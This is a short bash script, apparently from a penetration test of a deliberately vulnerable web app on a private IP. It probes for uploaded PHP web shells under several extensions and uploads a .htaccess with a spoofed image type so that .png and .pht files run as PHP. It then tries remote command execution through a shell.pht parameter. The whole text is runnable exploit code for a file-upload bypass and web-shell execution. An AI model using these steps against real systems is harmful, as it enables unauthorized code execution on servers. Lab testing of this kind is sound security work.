CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
B='http://10.31.0.87:3000'
mkdir -p evidence/upload
for FN in shell.pht shell.php3 shell.php4 shell.php5 shell.php7 shell.phar; do
  curl -s -b "$CK" "$B/hackable/uploads/$FN" -o /dev/null -w "$FN => %{http_code}\n"
done
# .htaccess upload to override handler at low
printf 'AddType application/x-httpd-php .png .pht\n' > /tmp/pwn_htaccess
R=$(curl -s -b "$CK; security=high" "$B/vulnerabilities/upload/" -F "uploaded=@/tmp/pwn_htaccess;filename=.htaccess;type=image/jpeg" -F "Upload=Upload" | grep -oE 'succesfully uploaded|not an image|only accept')
echo "high .htaccess => $R"
# double ext .php.png at high was "succesfully uploaded" — is it stored/reachable?
curl -s -b "$CK" "$B/hackable/uploads/shell.pht?c=echo+AEGIS_PHT" -o /dev/null -w "shell.pht exec => %{http_code}\n"
